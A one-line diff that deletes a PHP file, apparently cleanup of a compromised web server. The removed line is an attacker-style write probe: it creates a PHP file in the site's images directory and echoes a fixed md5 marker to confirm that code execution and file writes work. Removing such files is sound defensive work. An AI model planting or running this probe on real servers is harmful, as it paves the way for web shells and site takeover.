@@ -1,1 +1,0 @@
-<?php $root=dirname(__DIR__); $t=$root.'/images/sec-verify-1348519fbf.php'; if(@file_put_contents($t,'PATCH_FAILED',LOCK_EX)!==false){  echo md5('123qwe');}else{  echo 'WRITE_FAILED';} ?>
